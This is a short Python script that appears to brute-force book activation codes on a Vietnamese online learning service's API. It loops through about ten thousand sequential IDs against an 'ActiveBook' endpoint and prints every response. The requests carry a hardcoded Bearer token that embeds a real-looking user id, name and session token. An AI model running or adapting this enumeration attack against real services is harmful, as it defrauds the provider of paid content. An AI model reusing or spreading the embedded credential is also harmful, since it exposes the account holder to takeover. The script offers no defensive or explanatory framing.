import concurrent.futures
import requests

# Hàm gọi API
def moon(id):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8',
        'access-control-allow-headers': 'Access-Control-Allow-Origin, Accept',
        'access-control-allow-origin': '*',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjYxNjkxNTkxMDg1NTk4NjIwOTQiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiNjE2OTE1OTEwODU1OTg2MjA5NCIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiNjE2OTE1OTEwODU1OTg2MjA5NCIsImF2YXRhciI6IjIwMjQvOS8zZjE0ZTkzYS1kM2E4LTRjMjUtYmE1Yi0wYzAxZmEzMTAwZjcuanBnIiwiZnVsbG5hbWUiOiJUcnVuZyIsImV4cGlyZXMiOiIxNzU4MDU3ODY2Iiwic2Vzc2lvbmxvZ2ludG9rZW4iOiIzN0VFNDkzMDc3QkE1MTRGQkI2MTUxMDI2NzUzMDdERCIsInNlc3Npb25sb2dpbmRldmljZXR5cGUiOiJQQyIsIm5iZiI6MTcyNjUyMTg2NiwiZXhwIjoxNzU4MDU3ODY2LCJpc3MiOiJodHRwczovL21vb24udm4iLCJhdWQiOiJodHRwczovL21vb24udm4ifQ.KX02kQUbwvjeQ4sFwH8-aZU5bdquKR7D54mhknjDU3Q',
        'cache-control': 'no-cache',
        'origin': 'https://moon.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://moon.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    response = requests.get(f'https://courseapi.moon.vn/api/Account/ActiveBook/{str(id)}/800000', headers=headers)
    return response.json()


for i in range(8000000001,8000009999):
    print(moon(i))